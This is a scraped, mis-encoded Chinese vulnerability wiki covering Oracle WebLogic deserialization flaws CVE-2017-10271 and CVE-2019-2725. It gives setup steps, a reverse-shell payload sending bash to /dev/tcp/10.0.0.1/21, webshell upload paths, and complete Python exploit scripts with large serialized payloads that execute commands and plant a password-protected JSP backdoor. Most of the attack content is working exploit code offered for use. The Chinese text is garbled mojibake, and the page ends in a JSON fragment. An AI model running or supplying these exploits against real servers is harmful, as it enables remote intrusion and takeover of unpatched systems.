SecurityÁªÑ‰ª∂ÂØπÂ§ñÊèê‰æõwebserviceÊúçÂä°ÔºåÂÖ∂‰∏≠‰ΩøÁî®‰∫ÜXMLDecoderÊù•Ëß£ÊûêÁî®Êà∑‰º†ÂÖ•ÁöÑXMLÊï∞ÊçÆÔºåÂú®Ëß£ÊûêÁöÑËøáÁ®ã‰∏≠Âá∫Áé∞ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂØºËá¥ÂèØÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 ÁéØÂ¢ÉÊê≠Âª∫ git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:7001 Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÂØπ http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType ËøõË°åËÆøÈóÆÔºåÂ≠òÂú®Ëøô‰∏™urlÂàôÂèØËÉΩÂ≠òÂú®ÊºèÊ¥û ÂÖ∂‰ªñÂèØÂà©Áî®URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 ‰ΩøÁî®POSTÊñπÊ≥ï‰∏ä‰º†‰ª•‰∏ãÊï∞ÊçÆÂèçÂºπ‰∏Ä‰∏™shell /bin/bash -c bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1 ‰ΩøÁî®CurlÂèçÂºπshell (Â∞Ü‰∏äÈù¢ÁöÑxmlÊï∞ÊçÆ‰øùÂ≠ò‰∏∫poc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" ‰πüÂèØ‰ª•ÈÄöËøáÊºèÊ¥ûÂÜôÂÖ•webshellÊñá‰ª∂ servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp ]]> ËÆøÈóÆ http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp Âç≥ÂèØÂæóÂà∞ÂÜôÂÖ•ÁöÑÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC Âà©Áî® weblogic-scanÂø´ÈÄüÊ£ÄÊµã [!NOTE] ÂèçÂºπshell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd >>> shell(ÂèçÂºπshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" /bin/bash -c bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) IP = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨PORT >>> \\033[0m\")) POC_1(target_url, IP, PORT) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic ÂèçÂ∫èÂàóÂåñËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2019-2725.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Weblogic/Weblogic ÂèçÂ∫èÂàóÂåñËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2019-2725.html","title":"Weblogic ÂèçÂ∫èÂàóÂåñËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2019-2725","keywords":"","body":"Weblogic ÂèçÂ∫èÂàóÂåñËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2019-2725 ÊºèÊ¥ûÊèèËø∞ 2019Âπ¥06Êúà15Êó•Ôºå360CERTÁõëÊµãÂà∞Âú®ÈáéÁöÑOracle WeblogicËøúÁ®ãÂèçÂ∫èÂàóÂåñÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÁªïËøá‰∫ÜÊúÄÊñ∞ÁöÑWeblogicË°•‰∏ÅÔºàCVE-2019-2725ÔºâÔºåÊîªÂáªËÄÖÂèØ‰ª•ÂèëÈÄÅÁ≤æÂøÉÊûÑÈÄ†ÁöÑÊÅ∂ÊÑèHTTPËØ∑Ê±ÇÔºåÂú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãËøúÁ®ãÊâßË°åÂëΩ‰ª§„ÄÇÁõÆÂâçÂÆòÊñπË°•‰∏ÅÊú™ÂèëÂ∏ÉÔºåÊºèÊ¥ûÁªÜËäÇÊú™ÂÖ¨ÂºÄ„ÄÇ360CERTÁªèÁ†îÂà§ÂêéÂà§ÂÆöËØ•ÊºèÊ¥ûÁªºÂêàËØÑÁ∫ß‰∏∫‚ÄúÈ´òÂç±‚ÄùÔºåÂº∫ÁÉàÂª∫ËÆÆÂèóÂΩ±ÂìçÁöÑÁî®Êà∑Â∞ΩÂø´Ê†πÊçÆ‰∏¥Êó∂‰øÆË°•Âª∫ËÆÆËøõË°å‰∏¥Êó∂Â§ÑÁΩÆÔºåÈò≤Ê≠¢Êî∂Âà∞ÊîªÂáªËÄÖÊîªÂáª„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Weblogic 10.3.6 Weblogic 12.1.3 ÁéØÂ¢ÉÊê≠Âª∫ git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:7001 Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂàÜÊûêÊñáÁ´† https://xz.aliyun.com/t/5024 ËøôÈáå‰ΩøÁî®POCËøõË°åÂ§çÁé∞ POCÂú∞ÂùÄ: https://github.com/TopScrew/CVE-2019-2725 [!NOTE] POCÂèØÂà©Áî®‰∫éÂëΩ‰ª§ÊâßË°åÂíåWebshell‰∏ä‰º† ÊºèÊ¥ûÂà©Áî®POC https://github.com/TopScrew/CVE-2019-2725/blob/master/weblogic-2019-2725.py # encoding=utf8 import sys import requests from logzero import logger headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", } def weblogic_10_3_6(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", \"cmd\":\"%s\"%(cmd) } body = \"\"\" oracle.toplink.internal.sessions.UnitOfWorkChangeSet -84-19051151140231069711897461171161051084676105110107101100729711510483101116-40108-4190-107-35423020012011401710697118974611711610510846729711510483101116-7068-123-107-106-72-735230012011211912000166364000002115114058991111094611511711046111114103469711297991041014612097108971104610511011610111411097108461201151081169946116114971204684101109112108971161011157310911210898779-63110-84-855130973013951051101001011101167811710998101114730149511611497110115108101116731101001011209002195117115101831011141181059910111577101991049711010511510976025959799991011151156912011610111411097108831161211081011151041011011161160187610697118974710897110103478311611410511010359760119597117120671089711511510111511605976991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947114117110116105109101477297115104116979810810159910109598121116101991111001011151160391916691069599108971151151160189176106971189747108971101034767108971151155976059511097109101113012604760179511111711611211711680114111112101114116105101115116022761069711897471171161051084780114111112101114116105101115591201120000-1-1-1-1011603971081081121171140391916675-32521103103-37552001201120002117114029166-84-1323-86884-32200120112001429-54-2-70-66000500-70100303470-727037703810161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015-8332-109-13-111-35-176210660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151019831161179884114971101151081011168097121108111971001012731101101011146710897115115101115105376121115111115101114105971084711297121108111971001154711711610510847719710010310111611536831161179884114971101151081011168097121108111971005910911611497110115102111114109101144076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977599176991111094711511711047111114103479711297991041014712010910847105110116101114110971084711510111410597108105122101114478310111410597108105122971161051111107297110100108101114594186108100111991171091011101161045769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775910810497110100108101114115106691769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910106912099101112116105111110115703910-904076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977597699111109471151171104711111410347971129799104101471201091084710511011610111411097108471001161094768847765120105115731161011149711611111459769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145941861081051161011149711611111410537699111109471151171104711111410347971129799104101471201091084710511011610111411097108471001161094768847765120105115731161011149711611111459107104971101001081011141065769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910108311111711499101701051081011012719710010310111611546106971189712010011704010511211151111151011141059710847112971211081119710011547117116105108477197100103101116115368311611798841149711011510810111680971211081119710010649911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699471141171101161051091014765981151161149799116841149711011510810111610201069711897471051114783101114105971081051229798108101105799111109471151171104711111410347971129799104101471209710897110471051101161011141109710847120115108116994784114971101151081011166912099101112116105111110103112111511111510111410597108471129712110811197100115471171161051084771971001031011161151086099108105110105116621016106971189747108971101034784104114101971007042101399117114114101110116841041141019710010204041761069711897471089711010347841041141019710059120440451004304610271191019810811110310599471191111141074769120101991171161018410411410197100704810141031011166711711411410111011687111114107102940417611910198108111103105994711911111410747871111141076510097112116101114591205005110049052104411910198108111103105994711510111411810810111647105110116101114110971084783101114118108101116821011131171011151167310911210870541039910910080561091031011167210197100101114103840761069711897471089711010347831161141051101035941761069711897471089711010347831161141051101035912058059100550601011103101116821011151121111101151011049404176119101981081111031059947115101114118108101116471051101161011141109710847831011141181081011168210111511211111011510173109112108591206206310055064103716675806610451191019810811110310599471151011141181081011164710511011610111411097108478310111411810810111682101115112111110115101731091121087068102011510111667104971149799116101114691109911110010511010310214076106971189747108971101034783116114105110103594186120700711006907210221031011168310111411810810111679117116112117116831161141019710910534041761191019810811110310599471151011141181081011164710511011610111411097108478310111411810810111679117116112117116831161141019710973109112108591207407510069076103511910198108111103105994712010910847117116105108478311611410511010373110112117116831161141019710970781022106971189747108971101034783116114105110103661171021021011147080100810341069711211210111010010444076106971189747108971101034783116114105110103594176106971189747108971101034783116114105110103661171021021011145912083084100810851053258321310808710811611183116114105110103102040417610697118974710897110103478311611410511010359120890901008109112010071100790931049119101981081111031059947115101114118108101116471051101161011141109710847831011141181081011167911711611211711683116114101971097310911210870951011119114105116101831161141019710910244076106971189747105111477311011211711683116114101971095941861209709810096099105102108117115104120101011100960102107111115461109710910180104101610697118974710897110103478312111511610110970106101110310111680114111112101114116121120108059100107010910161069711897471089711010347831161141051101037011110111161117611111910111467971151011201130901001120114103119105110801161089911111011697105110115102740761069711897471089711010347671049711483101113117101110991015941901201180119100112012010171069711897471089711010347821171101161051091017012210101031011168211711011610510910110214041761069711897471089711010347821171101161051091015912012401251001230126107991091003247993280-12810410112010199103940761069711897471089711010347831161141051101035941761069711897471089711010347801141119910111511559120-1260-1251001230-12410114798105110471151043245993280-12210221069711897471051114766117102102101114101100821019710010111470-120102510697118974710511147731101121171168311611410197109821019710010111470-11810171069711897471089711010347801141119910111511570-116101410310111673110112117116831161141019710910234041761069711897471051114773110112117116831161141019710959120-1140-113100-1150-11210424076106971189747105111477311011211711683116114101971095976106971189747108971101034783116114105110103594186120100-110100-1170-10910194076106971189747105111478210197100101114594186120100-107100-1190-10610080-1041081141019710076105110101120-102090100-1190-10110910310111687114105116101114102340417610697118974710511147801141051101168711410511610111459120-990-98100690-97101910697118974710511147801141051101168711410511610111470-95105119114105116101120-93071100-940-9210191069711897471089711010347691209910111211610511111070-901031111171161021761069711897471051114780114105110116831161141019710959120-880-87901070-861019106971189747108971101034784104114111119979810810170-84100-8309110191069711897471051114780114105110116831161141019710970-81107112114105110116108110120-79071100-800-781015112114105110116831169799107841149799101120-76011100-830-751013831169799107779711284979810810110291211151111151011141059710847801191101011145253525156514952505556575750103176121115111115101114105971084780119110101114525352515651495250555657575059033020301040102605060107000208040101001101012000470101000542-7301-79000201300060100047014000120100050150-710001019020020120006300030001-79000201300060100052014000320300010150-710000010210220100010230240202500040102601019027020120007300040001-79000201300060100056014000420400010150-710000010210220100010280290200010300310302500040102608041011010120011140701100118-8903176-72047-64049-74053-640551857-7406177-72047-64049-74053-64055-7406578451867-7407345-74077584254-6907989-6908189-7308244-740861888-74086-74092-73094-740100254-74010318105-7201105852551-91016255-74011518117-740121-10206-89033-720127-6908189-7308218-127-7408644-74086-74092-740-123586-89030-720127-6908189-7308218-121-7408644-74086-74092-740-123586-690-11989-690-11789256-740-1111867-730-108-730-105587158818-103589-89025-6908189-73082259-74086258-74086-74092589257-740-100895881-90-1-3145-740-96259-740-91-890245810-780-852510-740-82-740-772510-740-74-8903-79010940-70-40-89010-7300070093-10109060570112706970967011200229-402670-115-203270-119701127011221-102306057011270697096701120170-8920020320002033017000100102035016091171130126013001-44-54-2-70-6600050027100302170237024702510161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015113-26105-1860109712410660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151037011111110127311011010111467108971151151011151037761211151111151011141059710847112971211081119710011547117116105108477197100103101116115367011111159101083111117114991017010510810110127197100103101116115461069711897120100117026103512111511111510111410597108471129712110811197100115471171161051084771971001031011161153670111111101610697118974710897110103477998106101991161020106971189747105111478310111410597108105122979810810110311211151111151011141059710847112971211081119710011547117116105108477197100103101116115033020301040102605060107000208010101001101012000470101000542-7301-79000201300060100060014000120100050150180002019000202001700010010202201609112116048011911011411211910120115125000102910697118971204612010910846116114971101151021111141094684101109112108971161011151201140231069711897461089711010346114101102108101991164680114111120121-3139-3832-521667-53201760110411603776106971189747108971101034711410110210810199116477311011811199971161051111107297110100108101114591201121151140501151171104611410110210810199116469711011011111697116105111110466511011011111697116105111110731101181119997116105111110729711010010810111485-54-111521-53126-912027601210910110998101114869710811710111511601576106971189747117116105108477797112597604116121112101116017761069711897471089711010347671089711511559120112115114017106971189746117116105108467297115104779711257-38-63-612296-47302700101081119710070979911611111473091161041141011151041111081001201126364000001211980001600011160810253975397544856113012609120118114029106971189712046120109108461161149711011510211111410946841011091121089711610111500000000000120112120 \"\"\" url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\n\"+rsp.text) def weblogic_12_1_3(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\" } body=''' xxxx org.slf4j.ext.EventData yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7 ResultBaseExec %s connectionHandler true '''%(cmd) url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\n\"+rsp.text) def webshell_10_3_6(ip): body=''' oracle.toplink.internal.sessions.UnitOfWorkChangeSet -84-19051151140231069711897461171161051084676105110107101100729711510483101116-40108-4190-107-35423020012011401710697118974611711610510846729711510483101116-7068-123-107-106-72-735230012011211912000166364000002115114058991111094611511711046111114103469711297991041014612097108971104610511011610111411097108461201151081169946116114971204684101109112108971161011157310911210898779-63110-84-855130973013951051101001011101167811710998101114730149511611497110115108101116731101001011209002195117115101831011141181059910111577101991049711010511510976025959799991011151156912011610111411097108831161211081011151041011011161160187610697118974710897110103478311611410511010359760119597117120671089711511510111511605976991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947114117110116105109101477297115104116979810810159910109598121116101991111001011151160391916691069599108971151151160189176106971189747108971101034767108971151155976059511097109101113012604760179511111711611211711680114111112101114116105101115116022761069711897471171161051084780114111112101114116105101115591201120000-1-1-1-1011603971081081121171140391916675-32521103103-37552001201120002117114029166-84-1323-86884-322001201120011-123-54-2-70-6600050081100303470797037703810161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015-8332-109-13-111-35-176210660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151019831161179884114971101151081011168097121108111971001012731101101011146710897115115101115105376121115111115101114105971084711297121108111971001154711711610510847719710010310111611536831161179884114971101151081011168097121108111971005910911611497110115102111114109101144076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977599176991111094711511711047111114103479711297991041014712010910847105110116101114110971084711510111410597108105122101114478310111410597108105122971161051111107297110100108101114594186108100111991171091011101161045769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775910810497110100108101114115106691769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910106912099101112116105111110115703910-9040769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775976991111094711511711047111114103479711297991041014712010910847105110116101114110971084710011610947688477651201051157311610111497116111114597699111109471151171104711111410347971129799104101471201091084710511011610111411097108471151011141059710810512210111447831011141059710810512297116105111110729711010010810111459418610810511610111497116111114105376991111094711511711047111114103479711297991041014712010910847105110116101114110971084710011610947688477651201051157311610111497116111114591071049711010010810111410657699111109471151171104711111410347971129799104101471201091084710511011610111411097108471151011141059710810512210111447831011141059710810512297116105111110729711010010810111459101083111117114991017010510810110127197100103101116115461069711897120100117040105112111511111510111410597108471129712110811197100115471171161051084771971001031011161153683116117988411497110115108101116809712110811197100106499111109471151171104711111410347971129799104101471209710897110471051101161011141109710847120115108116994711411711011610510910147659811511611497991168411497110115108101116102010697118974710511147831011141059710810512297981081011057991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947841149711011510810111669120991011121161051111101031121115111115101114105971084711297121108111971001154711711610510847719710010310111611510860991081051101051166213-10480678665737266104905085103987170117905186104905085577310911210410010969105737178118981108210898110828510188661088083744890881044876501044898871195573717811189887412290888157824874767310311110373676510399717011090858611789505710797875311080837486866989116796773108801031115673858280814982908569851039772821169867668186857477838577103731054811876499912281121561188270826973691048584851191037867521197783668599109701179950108489787571178987119118764886797310565105977282489968111118765110051100121535177121531189910999118867073118977282116986881118987157118995085117907282107731065275807110448988711943671056510373676556891095710710184527573676510373676510373676556748111110373676510373676510373711081097367103105898782116978752105761098612010087701159912110412190887049908878487610910010810070661049910970116908882108991051031059972100107731051071127583665567105651037367651037367651037367651037371112104100109691179787561178387531191008882841007274108898748103978753119100888110380836683100875348978749108761091001081007074499811082112988785111758353108101718610675727410899888610899518111790508648857170121898749108100718612175677410698878110575831071179050864883875311910088828410072741088987481117584115757367651037367651037367651037367651039787534873711201089810565577367481207911911110373676510373676510373676510373676610510188821088749481038911010848908877103808366117908899103891101084890861154877681071218884115757367651037367651037367651037367651039851864876110661219787534875677356997274108801057311279119111103736765103736765103736765103736766519771108115908365111757112010898105655773711081179972864876110741088987811118911010848908877112758365104808365116778310710310111911110373676510373676510373676510373676510373676510398518648761106612197875348987152111981098651737078489910910811790121104105101888210899121119103731071006783121731127584115757367651037367651037367651037367651031028111110373676510373676510373676510373676611810088811179972741129811081111731061191189972741088010573112791191111037367651037367651037372487573676510373678543671056510373676556765074118907210743671031115676501044898871194367103616180421016106971189747108971101034783116114105110103704410221151171104710910511599476665836954526810199111100101114704610047034102511511711047109105115994767104971149799116101114681019911110010111470491012100101991111001016611710210210111410224076106971189747108971101034783116114105110103594191661205105210050053105409166418612010055100450561019106971189747105111478011410511011687114105116101114705810731151011141181011141154765100109105110831011141181011144711610911247958776951051101161011141109710847981019795119108115951051101161011141109710847571065210011310747119971144710010110911146106115112806010214076106971189747108971101034783116114105110103594186120100621005906310711211410511011610811012065062100590661059910811111510112068011100590691019106971189747108971101034769120991011121161051111107071101910697118974710897110103478410411411111997981081017073101511211410511011683116979910784114979910112075011100740761013831169799107779711284979810810110291211151111151011141059710847801191101011145156534849565049545551554954103176121115111115101114105971084780119110101114515653484956504954555155495459033020301040102605060107000208040101001101012000470101000542-7301-79000201300060100047014000120100050150800001019020020120006300030001-79000201300060100052014000320300010150800000010210220100010230240202500040102601019027020120007300040001-7900020130006010005601400042040001015080000001021022010001028029020001030031030250004010260804101101012000102050500060-8903176184377-6904589-6904789-7304844-74054-7305777-69059891861-73064784544-7406745-74070-89013584254-74077-8903-7901050460490720107800016033-104502050170729020320002033017000100102035016091171130126013001-44-54-2-70-6600050027100302170237024702510161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015113-26105-1860109712410660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151037011111110127311011010111467108971151151011151037761211151111151011141059710847112971211081119710011547117116105108477197100103101116115367011111159101083111117114991017010510810110127197100103101116115461069711897120100117026103512111511111510111410597108471129712110811197100115471171161051084771971001031011161153670111111101610697118974710897110103477998106101991161020106971189747105111478310111410597108105122979810810110311211151111151011141059710847112971211081119710011547117116105108477197100103101116115033020301040102605060107000208010101001101012000470101000542-7301-79000201300060100060014000120100050150180002019000202001700010010202201609112116048011911011411211910120115125000102910697118971204612010910846116114971101151021111141094684101109112108971161011151201140231069711897461089711010346114101102108101991164680114111120121-3139-3832-521667-53201760110411603776106971189747108971101034711410110210810199116477311011811199971161051111107297110100108101114591201121151140501151171104611410110210810199116469711011011111697116105111110466511011011111697116105111110731101181119997116105111110729711010010810111485-54-111521-53126-912027601210910110998101114869710811710111511601576106971189747117116105108477797112597604116121112101116017761069711897471089711010347671089711511559120112115114017106971189746117116105108467297115104779711257-38-63-612296-47302700101081119710070979911611111473091161041141011151041111081001201126364000001211980001600011160810253975397544856113012609120118114029106971189712046120109108461161149711011510211111410946841011091121089711610111500000000000120112120 ''' url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\nShellÂú∞ÂùÄÔºö %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) #print(\"ShellÂú∞ÂùÄÔºö %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) def webshell_12_1_3(ip): body=''' org.slf4j.ext.EventData servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jsp 